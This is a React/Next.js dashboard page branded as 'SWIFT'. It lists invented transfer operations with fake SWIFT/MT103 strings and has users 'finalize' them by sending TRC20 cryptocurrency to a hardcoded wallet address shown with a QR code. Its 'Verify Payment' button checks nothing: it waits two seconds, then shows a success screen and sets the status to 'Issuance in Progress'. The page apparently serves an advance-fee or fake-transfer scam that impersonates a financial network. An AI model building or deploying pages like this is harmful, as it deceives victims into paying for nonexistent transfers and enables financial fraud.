"use client";

import { useState, useEffect, useRef } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
    LogOut,
    Plus,
    Clock,
    CheckCircle2,
    DollarSign,
    Search,
    ArrowUpRight,
    TrendingUp,
    Activity,
    X,
    Copy,
    Wallet,
    Loader2,
    ShieldCheck,
    RotateCcw
} from "lucide-react";
import { useRouter } from "next/navigation";
import Image from "next/image";

export default function DashboardPage() {
    const router = useRouter();
    const [activeTab, setActiveTab] = useState("pending");
    const [isModalOpen, setIsModalOpen] = useState(false);
    const [selectedOperationId, setSelectedOperationId] = useState<number | null>(null);
    const [amount, setAmount] = useState("");
    const [swiftCode, setSwiftCode] = useState("");
    const [copied, setCopied] = useState(false);
    const [currentUser, setCurrentUser] = useState("alemanrockefeller7");

    useEffect(() => {
        const user = localStorage.getItem("swift_user");
        if (user) setCurrentUser(user);
    }, []);

    const handleLogout = () => {
        router.push("/");
    };

    const copyToClipboard = () => {
        // Mock copy
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
    };

    const walletAddress = "TGk3tUxuQ2P5SLxFqWqJ8EvxypYLEieVco";



    const [pendingOperations, setPendingOperations] = useState<Operation[]>([]);
    const [isLoadingData, setIsLoadingData] = useState(true);

    // Fetch data from server
    useEffect(() => {
        const fetchData = async () => {
            try {
                const res = await fetch('/api/operations', { cache: 'no-store' });
                const data = await res.json();
                setPendingOperations(data);
            } catch (error) {
                console.error("Failed to fetch operations", error);
            } finally {
                setIsLoadingData(false);
            }
        };
        fetchData();
    }, []);

    // Polling to keep data in sync (simple "real-time" simulation)
    const pollingInterval = useRef<NodeJS.Timeout | null>(null);

    const startPolling = () => {
        if (pollingInterval.current) clearInterval(pollingInterval.current);
        pollingInterval.current = setInterval(async () => {
            try {
                const res = await fetch('/api/operations', { cache: 'no-store' });
                const data = await res.json();
                setPendingOperations(data);
            } catch (err) {
                console.error("Polling error:", err);
            }
        }, 5000);
    };

    // Initial fetch and start polling
    useEffect(() => {
        startPolling();
        return () => {
            if (pollingInterval.current) clearInterval(pollingInterval.current);
        };
    }, []);

    const [paymentStatus, setPaymentStatus] = useState<'idle' | 'verifying' | 'success'>('idle');

    const updateOperationStatus = async (id: number, status: string) => {
        // Optimistic update
        setPendingOperations(prev => prev.map(op =>
            op.id === id ? { ...op, status } : op
        ));

        // Restart polling to avoid race conditions (overwriting optimistic update with stale data)
        startPolling();

        // Server update
        try {
            const res = await fetch('/api/operations', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ id, status }),
                cache: 'no-store'
            });

            if (res.ok) {
                const updatedData = await res.json();
                setPendingOperations(updatedData);
            }
        } catch (error) {
            console.error("Failed to update status", error);
            // Revert is complex with polling, but polling will eventually correct it
        }
    };

    const handleRestore = (id: number) => {
        updateOperationStatus(id, "Pending");
    };

    const handleVerifyPayment = () => {
        if (selectedOperationId === null) return;
        setPaymentStatus('verifying');
        // Simulate network request
        setTimeout(() => {
            setPaymentStatus('success');
            // Update the pending operation status to "Issuance in Progress"
            updateOperationStatus(selectedOperationId, "Issuance in Progress");
        }, 2000);
    };

    const resetModal = () => {
        setIsModalOpen(false);
        setPaymentStatus('idle');
        setSelectedOperationId(null);
    };

    interface Operation {
        id: number;
        swift: string;
        amount: string;
        date: string;
        status?: string;
    }

    const completedOperations: Operation[] = [
        { id: 2, swift: "BCOEESMM//WFBIUS6SXXX//10,000,00//MT199//MT103//", amount: "10,000,00 $", date: "2024-12-17", status: "Paid" },
    ];

    return (
        <div className="min-h-screen w-full bg-black text-[#00FF00] font-sans selection:bg-[#00FF00] selection:text-black overflow-x-hidden relative">
            {/* Background Ambience & Particles */}
            <div className="fixed inset-0 w-full h-full pointer-events-none z-0">
                <div className="absolute top-[-10%] left-[-10%] w-[40%] h-[40%] bg-[#00FF00]/5 rounded-full blur-[120px] animate-pulse" />
                <div className="absolute bottom-[-10%] right-[-10%] w-[40%] h-[40%] bg-[#00FF00]/5 rounded-full blur-[120px] animate-pulse" style={{ animationDelay: "2s" }} />
                <div className="absolute top-[20%] right-[20%] w-[20%] h-[20%] bg-[#00FF00]/5 rounded-full blur-[80px]" />
            </div>

            {/* Header */}
            <nav className="border-b border-[#00FF00]/10 bg-black/40 backdrop-blur-xl sticky top-0 z-40">
                <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
                    <div className="flex justify-between items-center h-24">
                        <div className="flex items-center gap-4">
                            <div className="w-12 h-12 relative group cursor-pointer">
                                <div className="absolute inset-0 bg-[#00FF00]/20 blur-xl rounded-full group-hover:bg-[#00FF00]/40 transition-all duration-500" />
                                <Image
                                    src="/logo-header.png"
                                    alt="SWIFT Logo"
                                    fill
                                    className="object-contain relative z-10"
                                />
                            </div>
                            <span className="text-2xl font-black tracking-[0.2em] text-white drop-shadow-[0_0_10px_rgba(0,255,0,0.5)]">
                                SWIFT<span className="text-[#00FF00]">.</span>
                            </span>
                        </div>
                        <div className="flex items-center gap-8">
                            <div className="hidden md:flex flex-col items-end">
                                <span className="text-sm font-bold text-[#00FF00] tracking-wide">{currentUser}</span>
                                <span className="text-[10px] uppercase tracking-widest text-[#00FF00]/50 border border-[#00FF00]/20 px-2 py-0.5 rounded-full mt-1">Administrator</span>
                            </div>
                            <button
                                onClick={handleLogout}
                                className="p-3 rounded-xl bg-[#00FF00]/5 hover:bg-[#00FF00] hover:text-black border border-[#00FF00]/20 hover:border-[#00FF00] transition-all duration-300 group"
                            >
                                <LogOut className="h-5 w-5 group-hover:scale-110 transition-transform" />
                            </button>
                        </div>
                    </div>
                </div>
            </nav>

            {/* Main Content */}
            <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12 relative z-10">



                {/* Action Bar */}
                <div className="flex flex-col xl:flex-row justify-between items-center mb-10 gap-6">
                    <div className="flex sm:space-x-1 bg-black/40 p-1 rounded-xl border border-[#00FF00]/10 backdrop-blur-sm w-full xl:w-auto">
                        {['pending', 'completed'].map((tab) => (
                            <button
                                key={tab}
                                onClick={() => setActiveTab(tab)}
                                className={`relative flex-1 xl:flex-none px-4 py-2 rounded-lg text-[10px] sm:text-xs font-bold transition-all duration-300 uppercase tracking-wide overflow-hidden ${activeTab === tab
                                    ? 'text-black shadow-[0_0_15px_rgba(0,255,0,0.4)]'
                                    : 'text-[#00FF00]/60 hover:text-[#00FF00] hover:bg-[#00FF00]/5'
                                    }`}
                            >
                                {activeTab === tab && (
                                    <motion.div
                                        layoutId="activeTab"
                                        className="absolute inset-0 bg-[#00FF00] z-0"
                                        transition={{ type: "spring", bounce: 0.2, duration: 0.6 }}
                                    />
                                )}
                                <span className="relative z-10 whitespace-nowrap">{tab === 'pending' ? 'Pending Operations' : 'Completed Operations'}</span>
                            </button>
                        ))}
                    </div>
                </div>

                {/* Content Table */}
                <AnimatePresence mode="wait">
                    <motion.div
                        key={activeTab}
                        initial={{ opacity: 0, y: 20 }}
                        animate={{ opacity: 1, y: 0 }}
                        exit={{ opacity: 0, y: -20 }}
                        transition={{ duration: 0.4 }}
                        className="bg-black/40 border border-[#00FF00]/10 rounded-3xl overflow-hidden backdrop-blur-md"
                    >
                        <div className="overflow-x-auto">
                            <table className="w-full text-left min-w-[800px]">
                                <thead>
                                    <tr className="border-b border-[#00FF00]/10 bg-[#00FF00]/5">
                                        <th className="px-6 py-5 text-xs font-bold uppercase tracking-widest text-[#00FF00]/60">SWIFT Code</th>
                                        <th className="px-6 py-5 text-xs font-bold uppercase tracking-widest text-[#00FF00]/60">Amount</th>
                                        <th className="px-6 py-5 text-xs font-bold uppercase tracking-widest text-[#00FF00]/60 text-right">Status</th>
                                        {activeTab === 'pending' && <th className="px-6 py-5 text-xs font-bold uppercase tracking-widest text-[#00FF00]/60 text-center">Actions</th>}
                                    </tr>
                                </thead>
                                <tbody className="divide-y divide-[#00FF00]/5">
                                    {(activeTab === 'pending' ? pendingOperations : completedOperations).map((op, idx) => (
                                        <motion.tr
                                            initial={{ opacity: 0, x: -20 }}
                                            animate={{ opacity: 1, x: 0 }}
                                            transition={{ delay: idx * 0.1 }}
                                            key={op.id}
                                            className="group hover:bg-[#00FF00]/5 transition-colors duration-300"
                                        >
                                            <td className="px-6 py-5">
                                                <div className="flex items-center space-x-4">
                                                    <div className="h-10 w-10 rounded-xl bg-[#00FF00]/10 flex items-center justify-center group-hover:scale-110 group-hover:rotate-12 transition-all duration-300 border border-[#00FF00]/20 group-hover:border-[#00FF00]">
                                                        <Activity className="h-5 w-5 text-[#00FF00]" />
                                                    </div>
                                                    <span className="font-mono text-sm tracking-wider text-white group-hover:text-[#00FF00] transition-colors">{op.swift}</span>
                                                </div>
                                            </td>
                                            <td className="px-6 py-5 text-sm font-bold text-[#00FF00] drop-shadow-[0_0_5px_rgba(0,255,0,0.3)]">{op.amount}</td>
                                            <td className="px-6 py-5 text-right">
                                                <span className={`inline-flex items-center px-4 py-1 rounded-full text-xs font-bold uppercase tracking-wide border ${activeTab === 'pending'
                                                    ? 'bg-yellow-400/10 text-yellow-400 border-yellow-400/20 shadow-[0_0_10px_rgba(250,204,21,0.1)]'
                                                    : 'bg-[#00FF00]/10 text-[#00FF00] border-[#00FF00]/20 shadow-[0_0_10px_rgba(0,255,0,0.1)]'
                                                    }`}
                                                >
                                                    {op.status || (activeTab === 'pending' ? 'Pending' : 'Paid')}
                                                </span>
                                            </td>
                                            {activeTab === 'pending' && (
                                                <td className="px-6 py-5 text-center">
                                                    {op.status !== "Issuance in Progress" && (
                                                        <motion.button
                                                            whileHover={{ scale: 1.05 }}
                                                            whileTap={{ scale: 0.95 }}
                                                            onClick={() => {
                                                                setSwiftCode("BCOEESMM//WFBIUS6SXXX//10,000,00//MT199//MT103//");
                                                                setAmount("10,000,00");
                                                                setSelectedOperationId(op.id);
                                                                setIsModalOpen(true);
                                                                setPaymentStatus('idle');
                                                            }}
                                                            className="inline-flex items-center space-x-2 bg-[#00FF00]/10 hover:bg-[#00FF00] text-[#00FF00] hover:text-black border border-[#00FF00]/50 px-4 py-2 rounded-lg font-bold uppercase tracking-wider text-xs transition-all duration-300"
                                                        >
                                                            <CheckCircle2 className="h-3 w-3" />
                                                            <span>Finalize</span>
                                                        </motion.button>
                                                    )}
                                                    {op.status === "Issuance in Progress" && currentUser === "admin" && (
                                                        <motion.button
                                                            whileHover={{ scale: 1.05 }}
                                                            whileTap={{ scale: 0.95 }}
                                                            onClick={() => handleRestore(op.id)}
                                                            className="inline-flex items-center space-x-2 bg-yellow-400/10 hover:bg-yellow-400 text-yellow-400 hover:text-black border border-yellow-400/50 px-4 py-2 rounded-lg font-bold uppercase tracking-wider text-xs transition-all duration-300"
                                                        >
                                                            <RotateCcw className="h-3 w-3" />
                                                            <span>Restore</span>
                                                        </motion.button>
                                                    )}
                                                </td>
                                            )}
                                        </motion.tr>
                                    ))}
                                </tbody>
                            </table>
                        </div>

                        {/* Pagination */}
                        <div className="px-6 py-5 border-t border-[#00FF00]/10 bg-[#00FF00]/5 flex flex-col sm:flex-row gap-4 items-center justify-between text-xs text-[#00FF00]/40 font-mono">
                            <span>DISPLAYING {activeTab === 'pending' ? pendingOperations.length : completedOperations.length} RECORDS</span>
                            <div className="flex space-x-4">
                                <button className="hover:text-[#00FF00] transition-colors">PREV</button>
                                <span>/</span>
                                <button className="hover:text-[#00FF00] transition-colors">NEXT</button>
                            </div>
                        </div>
                    </motion.div>
                </AnimatePresence>

            </main>

            {/* Payment Modal */}
            <AnimatePresence>
                {isModalOpen && (
                    <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
                        <motion.div
                            initial={{ opacity: 0 }}
                            animate={{ opacity: 1 }}
                            exit={{ opacity: 0 }}
                            onClick={() => setIsModalOpen(false)}
                            className="absolute inset-0 bg-black/80 backdrop-blur-sm"
                        />

                        <motion.div
                            initial={{ opacity: 0, scale: 0.9, y: 20 }}
                            animate={{ opacity: 1, scale: 1, y: 0 }}
                            exit={{ opacity: 0, scale: 0.9, y: 20 }}
                            className="relative w-full max-w-lg bg-black border border-[#00FF00]/30 rounded-3xl p-8 shadow-[0_0_50px_rgba(0,255,0,0.2)] overflow-hidden"
                        >
                            {/* Decorative beams */}
                            <div className="absolute top-0 left-1/2 -translate-x-1/2 w-32 h-1 bg-[#00FF00] blur-sm shadow-[0_0_20px_#00FF00]" />

                            <div className="flex justify-between items-start mb-8">
                                <div>
                                    <h2 className="text-2xl font-black text-white tracking-tight uppercase">Deposit TRC20</h2>
                                    <p className="text-[#00FF00]/60 text-sm mt-1">Scan the QR code to proceed</p>
                                </div>
                                <button
                                    onClick={resetModal}
                                    className="p-2 rounded-full hover:bg-[#00FF00]/10 transition-colors"
                                >
                                    <X className="h-6 w-6 text-[#00FF00]" />
                                </button>
                            </div>

                            {paymentStatus === 'idle' && (
                                <div className="space-y-6">
                                    {/* SWIFT Code Input */}
                                    <div className="space-y-2">
                                        <label className="text-xs font-bold uppercase tracking-widest text-[#00FF00]/70">SWIFT Code</label>
                                        <div className="relative">
                                            <Activity className="absolute left-4 top-1/2 -translate-y-1/2 h-5 w-5 text-[#00FF00]" />
                                            <input
                                                type="text"
                                                value={swiftCode}
                                                readOnly
                                                className="w-full bg-[#050505] border border-[#00FF00]/20 rounded-xl py-4 pl-12 pr-4 text-white text-lg font-mono focus:border-[#00FF00] focus:ring-1 focus:ring-[#00FF00] outline-none transition-all placeholder-[#00FF00]/20 uppercase opacity-50 cursor-not-allowed"
                                            />
                                        </div>
                                    </div>

                                    {/* Amount Input */}
                                    <div className="space-y-2">
                                        <label className="text-xs font-bold uppercase tracking-widest text-[#00FF00]/70">Amount (USD)</label>
                                        <div className="relative">
                                            <DollarSign className="absolute left-4 top-1/2 -translate-y-1/2 h-5 w-5 text-[#00FF00]" />
                                            <input
                                                type="text"
                                                value={amount}
                                                readOnly
                                                className="w-full bg-[#050505] border border-[#00FF00]/20 rounded-xl py-4 pl-12 pr-4 text-white text-lg font-mono focus:border-[#00FF00] focus:ring-1 focus:ring-[#00FF00] outline-none transition-all placeholder-[#00FF00]/20 opacity-50 cursor-not-allowed"
                                            />
                                        </div>
                                    </div>

                                    {/* QR Code */}
                                    <div className="flex justify-center py-6">
                                        <div className="relative group">
                                            <div className="absolute -inset-1 bg-gradient-to-r from-[#00FF00] to-[#00aa00] rounded-xl blur opacity-25 group-hover:opacity-75 transition duration-500"></div>
                                            <div className="relative w-48 h-48 bg-white p-2 rounded-lg flex items-center justify-center overflow-hidden">
                                                <div className="relative w-full h-full">
                                                    <Image
                                                        src="/qr-code.png"
                                                        alt="TRC20 QR Code"
                                                        fill
                                                        className="object-contain"
                                                    />
                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                    {/* Wallet Address */}
                                    <div className="bg-[#00FF00]/5 border border-[#00FF00]/20 rounded-xl p-4 flex items-center justify-between">
                                        <div className="flex items-center gap-3">
                                            <div className="p-2 bg-[#00FF00]/10 rounded-lg">
                                                <Wallet className="h-5 w-5 text-[#00FF00]" />
                                            </div>
                                            <div className="flex flex-col">
                                                <span className="text-[10px] text-[#00FF00]/50 uppercase tracking-widest">Wallet Address</span>
                                                <span className="text-sm text-white font-mono truncate max-w-[200px]">{walletAddress}</span>
                                            </div>
                                        </div>
                                        <button
                                            onClick={copyToClipboard}
                                            className="p-2 hover:bg-[#00FF00]/10 rounded-lg transition-colors relative"
                                        >
                                            <AnimatePresence>
                                                {copied ? (
                                                    <motion.div
                                                        initial={{ scale: 0 }}
                                                        animate={{ scale: 1 }}
                                                        exit={{ scale: 0 }}
                                                    >
                                                        <CheckCircle2 className="h-5 w-5 text-[#00FF00]" />
                                                    </motion.div>
                                                ) : (
                                                    <motion.div
                                                        initial={{ scale: 0 }}
                                                        animate={{ scale: 1 }}
                                                        exit={{ scale: 0 }}
                                                    >
                                                        <Copy className="h-5 w-5 text-[#00FF00]/60" />
                                                    </motion.div>
                                                )}
                                            </AnimatePresence>
                                        </button>
                                    </div>

                                    <button
                                        onClick={handleVerifyPayment}
                                        className="w-full bg-[#00FF00] text-black font-black py-4 rounded-xl text-lg uppercase tracking-widest hover:bg-[#00CC00] hover:shadow-[0_0_20px_rgba(0,255,0,0.4)] transition-all transform active:scale-95"
                                    >
                                        Verify Payment
                                    </button>
                                </div>
                            )}

                            {paymentStatus === 'verifying' && (
                                <div className="flex flex-col items-center justify-center py-12 space-y-6">
                                    <div className="relative">
                                        <div className="absolute inset-0 bg-[#00FF00]/20 blur-xl rounded-full animate-pulse" />
                                        <Loader2 className="h-16 w-16 text-[#00FF00] animate-spin relative z-10" />
                                    </div>
                                    <div className="space-y-2 text-center">
                                        <h3 className="text-xl font-bold text-white tracking-wider">PROCESSING PAYMENT</h3>
                                        <p className="text-[#00FF00]/60 text-sm animate-pulse">Initiating verification...</p>
                                    </div>
                                </div>
                            )}

                            {paymentStatus === 'success' && (
                                <motion.div
                                    initial={{ opacity: 0, scale: 0.9 }}
                                    animate={{ opacity: 1, scale: 1 }}
                                    className="flex flex-col items-center justify-center py-8 space-y-6"
                                >
                                    <div className="relative">
                                        <div className="absolute inset-0 bg-[#00FF00]/20 blur-xl rounded-full" />
                                        <CheckCircle2 className="h-20 w-20 text-[#00FF00] relative z-10 drop-shadow-[0_0_15px_rgba(0,255,0,0.5)]" />
                                    </div>
                                    <div className="space-y-2 text-center">
                                        <h3 className="text-2xl font-black text-white tracking-widest">VERIFICATION IN PROGRESS</h3>
                                        <p className="text-[#00FF00] font-bold">Transaction ID: {swiftCode.slice(0, 8)}...Processing</p>
                                    </div>
                                    <div className="w-full bg-[#00FF00]/10 border border-[#00FF00]/20 rounded-xl p-4 mt-6">
                                        <div className="flex justify-between items-center text-sm">
                                            <span className="text-[#00FF00]/60">Status updated to:</span>
                                            <span className="text-[#00FF00] font-bold uppercase tracking-wider">Issuance in Progress</span>
                                        </div>
                                    </div>
                                    <button
                                        onClick={resetModal}
                                        className="w-full bg-[#00FF00] text-black font-black py-4 rounded-xl text-lg uppercase tracking-widest hover:bg-[#00CC00] hover:shadow-[0_0_20px_rgba(0,255,0,0.4)] transition-all mt-4"
                                    >
                                        Close
                                    </button>
                                </motion.div>
                            )}

                        </motion.div>
                    </div>
                )}
            </AnimatePresence>
        </div>
    );
}
